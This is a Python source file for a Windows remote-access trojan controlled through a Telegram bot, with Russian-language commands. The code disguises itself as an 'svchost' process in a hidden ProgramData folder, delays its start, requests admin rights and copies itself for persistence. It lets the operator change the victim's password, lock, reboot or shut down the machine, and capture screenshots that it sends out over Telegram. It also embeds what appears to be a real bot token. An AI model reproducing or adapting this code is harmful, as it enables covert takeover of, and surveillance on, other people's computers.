import os
import sys
import shutil
import ctypes
import random
import time
import subprocess
import tempfile
import logging
from datetime import datetime
from telegram import Update
from telegram.ext import Application, ContextTypes, MessageHandler, filters

BOT_TOKEN = "7721586585:AAE0kUooswBZCUYQu1_5i2YTYyU1hWoPsj0"
ADMIN_ID = 8061304275
DELAY_BEFORE_START = 300
MAX_RETRIES = 2

def rnd_name():
    return ''.join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZ") for _ in range(4))

SERVICE_NAME = f"svchost_{rnd_name()}"
TASK_NAME = f"Windows\{SERVICE_NAME}"

PROGRAM_DATA = os.getenv("ProgramData", r"C:\ProgramData")
BASE_DIR = os.path.join(PROGRAM_DATA, "Windows", "SystemTemp")
EXE_PATH = os.path.join(BASE_DIR, f"{SERVICE_NAME}.exe")

logging.basicConfig(
    level=logging.CRITICAL,
    filename=os.path.join(BASE_DIR, "wua.log"),
    format="[%(asctime)s] %(message)s",
)

def hide_file(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)
    except: 
        pass

def is_admin():
    try: 
        return ctypes.windll.shell32.IsUserAnAdmin()
    except: 
        return False

def install_self():
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        shutil.copy2(sys.argv[0], EXE_PATH)
        hide_file(EXE_PATH)
        hide_file(BASE_DIR)
    except Exception as e:
        logging.critical(f"Install error: {e}")
        sys.exit(1)

def shutdown_pc():
    try:
        ctypes.windll.user32.ExitWindowsEx(1, 0)
        time.sleep(3)
    except:
        os.system("shutdown /s /t 0")

def change_password(user, new_pass):
    methods = [_change_password_winapi, _change_password_net]
    for method in methods:
        try:
            if method(user, new_pass):
                return True
        except: 
            continue
    return False

def _change_password_net(user, new_pass):
    try:
        subprocess.run(
            ["net", "user", user, new_pass],
            check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10
        )
        return True
    except: 
        return False

def _change_password_winapi(user, new_pass):
    try:
        advapi32 = ctypes.windll.advapi32
        advapi32.NetUserChangePassword(None, user.encode('utf-8'), None, new_pass.encode('utf-8'))
        return True
    except: 
        return False

def lock_pc():
    try: 
        ctypes.windll.user32.LockWorkStation()
    except: 
        os.system("rundll32.exe user32.dll,LockWorkStation")

def reboot_pc():
    try: 
        ctypes.windll.user32.ExitWindowsEx(2, 0)
    except: 
        os.system("shutdown /r /t 0")

def take_screenshot():
    try:
        import pyautogui
        tmp = os.path.join(tempfile.gettempdir(), f"sc_{rnd_name()}.png")
        pyautogui.screenshot(tmp)
        return tmp
    except: 
        return None

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: 
        return

    text = update.message.text  
    if text == "🔑 Смена пароля":  
        await update.message.reply_text("Введите новый пароль:")  
        context.user_data["awaiting_password"] = True  
    
    elif context.user_data.get("awaiting_password"):  
        if change_password(os.getlogin(), text):  
            await update.message.reply_text("✅ Пароль изменен.")  
        else:  
            await update.message.reply_text("❌ Ошибка. Пароль не изменен.")  
        context.user_data["awaiting_password"] = False  

    elif text == "🔒 Блокировка":  
        lock_pc()  
        await update.message.reply_text("✅ ПК заблокирован.")  

    elif text == "🔄 Перезагрузка":  
        reboot_pc()  
        await update.message.reply_text("✅ Перезагрузка...")  

    elif text == "⏹ Выключение":  
        shutdown_pc()  
        await update.message.reply_text("✅ Выключение...")  

    elif text == "📸 Скриншот":  
        screenshot_path = take_screenshot()  
        if screenshot_path:  
            with open(screenshot_path, "rb") as f:  
                await update.message.reply_photo(f)  
            os.remove(screenshot_path)  
        else:  
            await update.message.reply_text("❌ Не удалось сделать скриншот.")

if __name__ == "__main__":
    if DELAY_BEFORE_START > 0:
        time.sleep(DELAY_BEFORE_START)

    if not is_admin():  
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1)  
        sys.exit(0)  
    
    if not os.path.exists(EXE_PATH):  
        install_self()  
    
    app = Application.builder().token(BOT_TOKEN).build()  
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_command))  
    app.run_polling()